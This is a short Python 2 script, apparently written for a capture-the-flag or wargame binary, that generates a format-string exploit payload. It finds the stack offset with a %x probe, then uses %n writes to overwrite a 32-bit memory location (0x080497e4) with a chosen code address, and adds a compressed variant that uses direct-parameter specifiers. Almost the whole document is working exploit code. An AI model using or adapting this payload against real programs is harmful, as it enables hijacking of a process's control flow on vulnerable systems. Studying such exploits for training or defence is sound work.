# -*- coding: utf-8 -*-
import struct

def p32(addr):
    return struct.pack("<I", addr)

# ---------------
# run < <(python -c 'print "AAAA" + "%x." * 24')
write_pos = len("AAAA0.0.0.f7f81cf7.f7ffb000.ffffd1d8.804857d.ffffc1d0.ffffc1d0.fff.0.41414141".split("."))

# run < <(python -c 'import struct; print struct.pack("<I", 0x080497e4) + "%x" * 11 + "%n"')
# [*] 11 is (write_pos - 1)
# x/wx 0x080497e4
already_written = 0x3a

payload_lim = 1024
pad = "AAAA"

starting_addr = 0x080497e4

# If bytes are written in reverse order, reverse them using [::-1] 
byte_seq = [0x08, 0x04, 0x85, 0x03][::-1]
assert len(byte_seq) % 2 == 0

# ----------------

mmap = dict(zip(map(lambda i: starting_addr + i, range(len(byte_seq))), byte_seq))
addrs = pad.join(map(lambda a: p32(a), mmap.keys()))

# -0x5 is a random adjustment
additions = map(lambda (i, t): 256 * (i + 1) + t, enumerate([len(addrs) + already_written - 0x5] + list(mmap.values())))
additions = [y - x for x, y in zip(additions, additions[1:])]
format_additions = "%x" * (write_pos - 2) + "".join(map(lambda add: "%{}x".format(add) + "%n", additions))

payload = addrs + format_additions
if len(payload) <= payload_lim:
    print payload
    exit(0)

# --------------
# Trying to compress the payload by removing pads and using "$" specifier + byte grouping
# P.s: for whatever the f*ck reason "$" may not work

from math import log, ceil
from collections import OrderedDict

byte_seq = list(map(lambda (f, s): (s << (4 * int(ceil(log(f, 16))))) + f, zip(byte_seq[0::2], byte_seq[1::2])))
mmap = dict(zip(map(lambda i: starting_addr + i , range(0, len(byte_seq) * 2, 2)), byte_seq))
mmap = OrderedDict(sorted(mmap.items(), key=lambda p: p[1]))
addrs = "".join(map(lambda a: p32(a), mmap.keys()))

additions = [len(addrs)] + list(mmap.values())
additions = [y - x for x, y in zip(additions, additions[1:])]
format_additions = "".join(map(lambda (i, add): "%{}x".format(add) + "%{}$n".format(write_pos + i), enumerate(additions)))

payload = addrs + format_additions
assert len(payload) <= payload_lim
print payload
